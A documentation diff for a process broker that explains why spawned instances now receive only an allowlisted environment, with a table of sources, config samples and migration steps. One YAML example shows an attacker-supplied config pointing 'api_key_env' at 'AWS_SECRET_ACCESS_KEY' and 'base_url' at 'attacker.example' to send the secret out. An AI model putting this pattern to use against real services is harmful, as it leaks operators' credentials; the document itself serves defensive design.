@@ -165,9 +165,111 @@ one you meant is visible in the boot log rather than inferred later.
 **A variant can extend a spawn, never redirect it.** `args` are appended *after*
 the broker's own `-config` / `-recall` arguments, so an entry can add flags but
 cannot displace the contract the instance protocol depends on. `env` is merged
-over the broker process's environment, but the three `NEXUS_BROKER_*` dial-back
-variables are applied **last and always win** — an entry cannot point an instance
-at a different broker, hand it another lease id, or supply its own spawn secret.
+over whatever the spawn inherited from the broker, but the three `NEXUS_BROKER_*`
+dial-back variables are applied **last and always win** — an entry cannot point an
+instance at a different broker, hand it another lease id, or supply its own spawn
+secret.
+
+### What environment an instance is given
+
+A spawned instance does **not** inherit the broker's environment. It is built
+from nothing, in this order (later wins, since `exec` resolves a duplicated key
+to its last occurrence):
+
+| # | Source | Contents |
+|---|---|---|
+| 1 | Always-pass | `HOME`, `LANG`, `PATH`, `TZ`, taken from the broker regardless of config |
+| 2 | `inherit_env` | Each name it lists, taken from the broker — skipped if the broker does not hold it |
+| 3 | The entry's `env` | Set outright, in sorted key order |
+| 4 | Broker-owned | `NEXUS_BROKER_ADDR`, `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET` |
+
+The reason is not tidiness. A claim supplies the **whole engine config**, and a
+Nexus provider resolves its credential from an environment variable that config
+*names* (`api_key_env` and its equivalents) while the same config sets
+`base_url`. Anything an instance holds is therefore readable *and* postable
+anywhere by whoever claimed the lease:
+
+```yaml
+# a claim body's `config`
+core:
+  models:
+    default:
+      provider: openai
+      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
+      base_url: https://attacker.example    # where its value gets sent
+```
+
+An allowlist of *known* provider key names cannot close that, because the caller
+picks the name. Only reducing the environment to what the operator declared
+bounds it.
+
+`HOME` and `PATH` are in the always-pass set for reasons that have nothing to do
+with credentials: `HOME` resolves `~/.nexus`, so without it an instance cannot
+create a session directory and `-recall` has nothing to resume, and `PATH` is
+what makes `exec` and the shell tool work at all.
+
+```yaml
+# broker.yaml
+inherit_env:                 # names only — the values come from the broker's own env
+  - ANTHROPIC_API_KEY
+  - OPENAI_API_KEY
+```
+
+Use `inherit_env` when the value lives in the **broker's** environment (injected
+by systemd, Kubernetes, or a secrets agent) and a variant's `env` when the value
+is a property of the **variant**. A claim's `config` can still carry a credential
+inline, in which case neither key is involved.
+
+At boot the broker names, per registry entry, exactly what that entry's spawns
+will carry — **names only, never values**:
+
+```
+level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
+  resolved_path=/opt/builds/nexus-vision \
+  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
+```
+
+The line reports what will be **carried**, not what was declared, so a name
+missing from it was never in the broker's own environment. Those are also
+collected into one startup `WARN` naming them.
+
+#### Migrating: instances no longer inherit the broker's environment
+
+**This is a breaking change.** A broker that was started with
+`ANTHROPIC_API_KEY` exported into its shell used to pass it to every instance it
+spawned. It no longer does, and an instance whose config expects to read it will
+fail to reach a provider on its first turn.
+
+To migrate, take each variable your instances rely on and put it in one of two
+places:
+
+- it lives in the **broker's** environment → add its **name** to `inherit_env`;
+- it is a property of one **variant** → set it under that entry's `env`.
+
+```yaml
+# before — worked only because the broker's whole environment was inherited
+binaries:
+  nexus:
+    path: /usr/local/bin/nexus
+
+# after
+inherit_env:
+  - ANTHROPIC_API_KEY
+  - OPENAI_API_KEY
+binaries:
+  nexus:
+    path: /usr/local/bin/nexus
+```
+
+Two things make the break loud rather than silent. The per-entry boot line above
+lists everything a spawn will carry, so a variable you expected and do not see is
+visible **at startup** rather than at the first turn; and a name you declared that
+the broker does not actually hold is called out in its own startup `WARN`.
+
+There is no opt-out and no compatibility flag. `inherit_env: ["*"]` is not
+supported — a wildcard would restore exactly the exfiltration primitive above,
+and the caller's ability to name any variable is what makes "just the risky ones"
+an impossible line to draw.
 
 **Which entry ran a session is remembered**, so a resume re-uses it instead of
 falling back to `nexus`, and a resume that names a *different* variant is refused
@@ -701,7 +803,10 @@ certainly valid on *this* broker, read
 The entry's `args` are appended after the broker's own `-config` / `-recall`
 arguments, and its `env` is layered under the broker-owned `NEXUS_BROKER_*`
 variables — an entry can extend a spawn but never redirect it at another broker
-or supply its own spawn secret.
+or supply its own spawn secret. The spawned instance carries **only** the
+always-pass set, whatever `inherit_env` declares, the entry's `env` and the
+`NEXUS_BROKER_*` trio — see
+[What environment an instance is given](#what-environment-an-instance-is-given).
 
 ### New vs. resume
 
